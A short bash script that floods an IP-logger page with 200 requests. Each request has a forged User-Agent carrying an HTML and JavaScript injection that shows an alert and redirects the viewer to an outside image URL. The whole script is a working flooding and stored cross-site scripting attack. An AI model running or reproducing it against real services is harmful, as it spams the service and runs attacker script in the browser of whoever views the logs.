#!/bin/bash
count=200; #Spam counter!
RED='\033[0;31m'
GREEN='\e[32m'
NC='\033[0m'
if [[ $1 == 'start' ]]; then 
	printf "${RED}Start flooding...${NC}\n"
	for ((i=0; i < count; i++)) ; do
		curl --silent --output /dev/null -A "IP-Logger/3.0.1 (Flood; HackOS; Linux x86_64; rv:52.4) <b>Flood $((i))!</b> <script>alert('Anti IP-Logger!'); window.location.href = 'https://akk.li/pics/anne/jpg';</script>" https://example.com/iplogger.php > /dev/null
	done
	printf "${GREEN}Flooding has been finished!${NC}\n"
else
	printf "${RED}Start it with 'start'!${NC}\n"
fi
